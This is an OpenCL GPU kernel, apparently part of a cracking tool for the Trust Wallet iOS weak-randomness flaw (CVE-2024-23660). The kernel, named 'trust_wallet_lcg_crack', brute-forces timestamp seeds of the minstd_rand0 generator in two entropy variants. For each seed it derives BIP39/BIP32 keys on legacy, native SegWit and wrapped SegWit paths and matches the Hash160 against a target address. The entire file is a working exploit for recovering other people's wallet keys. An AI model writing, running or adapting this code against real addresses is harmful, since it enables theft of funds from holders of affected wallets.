// Trust Wallet iOS Vulnerability (CVE-2024-23660) — LCG/minstd_rand0 GPU Scanner
//
// PRNG: std::minstd_rand0  (Park-Miller Lehmer LCG)
//   x_{n+1} = (16807 * x_n) mod (2^31 - 1)
//   Output range: [1, 2_147_483_646]
//
// Seed normalisation (matches libstdc++ / libc++ behaviour):
//   s = seed % M;  if (s == 0) s = 1;
//
// Two entropy strategies, both making 16 next_u32() calls for 16 bytes:
//
//   VariantAnd  (Python variant B / Trezor variant_b):
//       entropy[i] = rng() & 0xFF   -->  byte in [0, 255]
//
//   VariantMod  (Python variant A / Trezor variant_a):
//       entropy[i] = rng() % 0xFF   -->  byte in [0, 254]  (0xFF never produced!)
//
// Three derivation paths:
//   m/44'/0'/0'/0/0  P2PKH          (legacy 1...)
//   m/84'/0'/0'/0/0  P2WPKH         (native SegWit bc1q...)
//   m/49'/0'/0'/0/0  P2SH-P2WPKH   (wrapped SegWit 3...)
//
// Global work size = 6 x (end_ts - start_ts).
//   gid -> timestamp = gid/6 + offset
//          combo     = gid%6
//   combo 0: VariantAnd + m/44'  (P2PKH)
//   combo 1: VariantMod + m/44'  (P2PKH)
//   combo 2: VariantAnd + m/84'  (P2WPKH)
//   combo 3: VariantMod + m/84'  (P2WPKH)
//   combo 4: VariantAnd + m/49'  (P2SH-P2WPKH)
//   combo 5: VariantMod + m/49'  (P2SH-P2WPKH)
//
// Result: results[idx] = (ulong)timestamp | ((ulong)combo << 32)

// ---------------------------------------------------------------------------
// minstd_rand0 step: x = (16807 * x) mod (2^31 - 1)
// ---------------------------------------------------------------------------
static uint minstd_next(uint state) {
    return (uint)(((ulong)state * 16807UL) % 2147483647UL);
}

// ---------------------------------------------------------------------------
// Seed normalisation: s = seed % M; if (s == 0) s = 1
// ---------------------------------------------------------------------------
static uint minstd_seed(uint seed) {
    uint s = seed % 2147483647u;
    return (s == 0u) ? 1u : s;
}

// ---------------------------------------------------------------------------
// Strategy VariantAnd: 16 calls, entropy[i] = rng() & 0xFF
// byte range [0, 255]
// ---------------------------------------------------------------------------
static void lcg_entropy_and(
    uint seed,
    __private uchar entropy[16])
{
    uint s = minstd_seed(seed);
    for (int i = 0; i < 16; i++) {
        s = minstd_next(s);
        entropy[i] = (uchar)(s & 0xFFu);
    }
}

// ---------------------------------------------------------------------------
// Strategy VariantMod: 16 calls, entropy[i] = rng() % 0xFF
// byte range [0, 254] — 0xFF is NEVER produced
// ---------------------------------------------------------------------------
static void lcg_entropy_mod(
    uint seed,
    __private uchar entropy[16])
{
    uint s = minstd_seed(seed);
    for (int i = 0; i < 16; i++) {
        s = minstd_next(s);
        entropy[i] = (uchar)(s % 255u);  // 0xFF == 255u
    }
}

// ---------------------------------------------------------------------------
// Main kernel
// ---------------------------------------------------------------------------
__kernel void trust_wallet_lcg_crack(
    __global ulong* results,
    __global uint*  result_count,
    ulong  target_h160_part1,   // bytes  0-7  packed LE
    ulong  target_h160_part2,   // bytes  8-15 packed LE
    uint   target_h160_part3,   // bytes 16-19 packed LE
    uint   offset,              // start_timestamp
    uint   range                // number of timestamps to check (bounds guard)
) {
    uint gid       = get_global_id(0);
    uint combo     = gid % 6u;
    uint ts_offset = gid / 6u;

    // Bounds check: ghost work-items from alignment padding must be skipped
    if (ts_offset >= range) return;

    uint timestamp = ts_offset + offset;

    // ---- Entropy generation -----------------------------------------------
    // combo bit 0: 0 = VariantAnd, 1 = VariantMod
    uchar entropy[16];
    if ((combo & 1u) == 0u) {
        lcg_entropy_and(timestamp, entropy);
    } else {
        lcg_entropy_mod(timestamp, entropy);
    }

    // ---- Derivation path --------------------------------------------------
    // combo 0,1 -> m/44' (P2PKH)
    // combo 2,3 -> m/84' (P2WPKH)
    // combo 4,5 -> m/49' (P2SH-P2WPKH)
    uint purpose;
    if (combo < 2u)       purpose = 44u;
    else if (combo < 4u)  purpose = 84u;
    else                  purpose = 49u;

    // ---- BIP39: entropy -> mnemonic -> seed --------------------------------
    uchar seed[64];
    bip39_entropy_to_seed_complete(entropy, seed);

    // ---- BIP32: master key ------------------------------------------------
    extended_private_key_t mk;
    new_master_from_seed(0, seed, &mk);

    // ---- Derive m/purpose'/0'/0'/0/0 -------------------------------------
    extended_private_key_t k_purpose;
    hardened_private_child_from_private(&mk, &k_purpose, purpose);

    extended_private_key_t k_coin;
    hardened_private_child_from_private(&k_purpose, &k_coin, 0u);

    extended_private_key_t k_account;
    hardened_private_child_from_private(&k_coin, &k_account, 0u);

    extended_private_key_t k_change;
    normal_private_child_from_private(&k_account, &k_change, 0u);

    extended_private_key_t k_addr;
    normal_private_child_from_private(&k_change, &k_addr, 0u);

    // ---- Public key -> Hash160 -------------------------------------------
    extended_public_key_t pub;
    public_from_private(&k_addr, &pub);

    uchar hash160[20];

    if (combo >= 4u) {
        // P2SH-P2WPKH (BIP49):
        //   inner = HASH160(compressed_pubkey)
        //   witness_script = OP_0 OP_DATA_20 inner   (22 bytes)
        //   outer = HASH160(witness_script)  <-- this is what goes in the scriptPubKey
        uchar inner_h160[20];
        identifier_for_public_key(&pub, inner_h160);

        uchar witness_script[22] __attribute__((aligned(4)));
        witness_script[0] = 0x00;
        witness_script[1] = 0x14;
        for (int i = 0; i < 20; i++) witness_script[i + 2] = inner_h160[i];

        uchar sha256_result[32] __attribute__((aligned(4)));
        sha256((__private uint*)witness_script, 22, (__private uint*)sha256_result);
        ripemd160(sha256_result, 32, (__private uchar*)hash160);
    } else {
        // P2PKH and P2WPKH both use plain HASH160(pubkey)
        identifier_for_public_key(&pub, hash160);
    }

    // ---- Pack and compare ------------------------------------------------
    ulong h1 = 0UL, h2 = 0UL;
    uint  h3 = 0u;
    for (int i = 0; i < 8; i++) h1 |= ((ulong)hash160[i])      << (i * 8);
    for (int i = 0; i < 8; i++) h2 |= ((ulong)hash160[i + 8])  << (i * 8);
    for (int i = 0; i < 4; i++) h3 |= ((uint) hash160[i + 16]) << (i * 8);

    if (h1 == target_h160_part1 &&
        h2 == target_h160_part2 &&
        h3 == target_h160_part3)
    {
        uint idx = atomic_inc(result_count);
        if (idx < 1024u) {
            results[idx] = (ulong)timestamp | ((ulong)combo << 32);
        }
    }
}
